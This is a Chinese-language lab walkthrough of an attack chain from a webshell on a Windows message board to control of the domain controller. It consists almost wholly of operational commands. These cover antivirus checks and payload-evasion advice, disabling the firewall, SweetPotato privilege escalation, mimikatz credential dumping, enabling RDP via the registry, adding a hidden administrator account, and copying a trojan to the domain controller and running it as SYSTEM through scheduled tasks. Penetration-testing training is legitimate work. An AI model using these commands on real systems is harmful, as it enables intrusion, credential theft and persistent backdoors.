实验环境

Windows 7: 10.80.4.23

Windows server 2016: 10.80.4.24

Kali linux: 10.80.4.25

02

实验步骤

首先给网站留言板上传个小马


通过蚁剑连接,这里记得改ua头，默认User-Agent: antSword/v2.0（也可以在/modules/request.js和/modules/update.js里改，一劳永逸）

查杀软，输入

WMIC /Node: localhost /Namespace: \\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

使用cs生成payload 然后通过编码混淆，分离加载或者一些开源工具进行免杀，在本地测试完后上传，能过就行

通过蚁剑上传之后运行成功上线

通过命令systemifo查看补丁和系统情况进行提权。

这里先把防火墙关了，命令：

netsh advfirewall set allprofiles state off

通过sweetpotato提权

接下来hashdump 读内存密码 用mimikatz读密码：logonpasswords。获取账户凭证。

发现有账号密码：

默认开启了3389端口，如果没开可以通过cmd命令开启

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

Rdesktop用户登录 成功登录win7

如果没有抓到账号密码，可以通过创建隐藏账户的方法进行登录，命令

net user abc$ admin.123 /addnet localgroup administrators abc$ /add


查询域控主机

nslookup -type=SRV _ldap._tcp


查看当前登录域

net config workstation


通过扫描发现开启了139，445端口

Access-> make token后

shell dir \\主机名\c$

可以列出主机中文件 说明有ipc$ 建立


之后可以通过copy 将木马文件复制到目标主机

copy 123.exe \\DC\c$


建立计划任务

schtasks /create /s DC /tn 123 /sc onstart /tr c:\123.exe /ru system /f

执行

schtasks /run /s DC /i /tn 123
